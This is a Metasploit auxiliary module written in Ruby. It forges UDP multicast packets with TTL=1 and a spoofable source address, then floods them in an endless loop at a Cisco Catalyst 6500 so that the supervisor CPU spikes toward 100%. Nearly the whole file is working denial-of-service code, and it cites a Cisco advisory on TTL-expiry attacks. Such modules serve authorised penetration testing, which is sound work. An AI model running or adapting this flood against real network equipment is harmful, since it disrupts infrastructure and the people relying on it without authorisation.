##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'racket'
require 'pcaprub'

class Metasploit3 < Msf::Auxiliary

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Forge TTL=1 Multicast Packets punted to the CPU.',
            'Description'    => %q{
                This module forges TTL=1 packets to punt packets to the supervisor card CPU.
                Some supervisors cards of the Catalyst 6500 chassis handle badly TTL=1 packets
                and cause CPU spikes near to 100% if none workaround is configured.
            },
            'Author'         => [ 'pello' ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision$',
            'References'     => [ [ 'URL', 'http://www.cisco.com/web/about/security/intelligence/ttl-expiry.html' ] ],
            'Actions'     =>
                [
                    [ 'Service' ]
                ],
            'PassiveActions' =>
                [
                    'Service'
                ],
            'DefaultAction'  => 'Service'
        ))
        register_options(
            [
                OptString.new('SMAC', [ true,  "Source MAC Address", '']),
                OptString.new('SIP', [ true,  "Source IP Address", '']),
                OptString.new('DMAC', [ true,  "Target MAC Address", '']),
                OptString.new('DIP', [ true,  "Multicast Destination Address", '']),
                OptString.new('IFACE', [ true,  "Interface To Use", 'eth0']),
            ], self.class)
    end

    def run
    begin
            n = Racket::Racket.new
            runningattack = true

            n.l2 = Racket::L2::Ethernet.new()
            n.l2.src_mac   = datastore['SMAC'] # Attacker Mac Address
            n.l2.dst_mac   = datastore['DMAC'] # Cisco target device Mac Address
            n.l2.ethertype = 0x0800

            n.l3 = Racket::L3::IPv4.new()
            n.l3.src_ip    = datastore['SIP'] # Attacker source IP (or Target IP address)
            n.l3.dst_ip    = datastore['DIP'] # Mulitcast destination address
            n.l3.ttl       = 0x1
            n.l3.protocol  = 0x11 # UDP

            n.l4 = Racket::L4::UDP.new()
            n.l4.src_port = 0
            n.l4.dst_port = 0
            n.l4.payload   = "A" * 1400
            n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)

            n.iface = datastore['IFACE']
            n.pack()

            while runningattack
                n.send2()
            end
    end
    end

end
